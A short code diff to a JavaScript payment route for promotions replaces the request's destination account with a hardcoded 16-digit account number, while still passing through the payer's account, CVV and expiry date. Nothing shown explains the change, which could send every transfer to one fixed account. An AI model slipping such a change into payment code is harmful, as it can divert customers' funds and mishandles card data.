@@ -276,7 +276,7 @@ router.post("/PromocionesRecepcionTR",(req,res)=>{
      const{idProducto,cantidad,precio}=req.body;
 
      const envio={
-        destiny_account: req.body.destiny_account,
+        destiny_account: "5138100775916044",
         origin_account: req.body.origin_account,
         cvv: req.body.cvv,
         exp_date: req.body.exp_date,
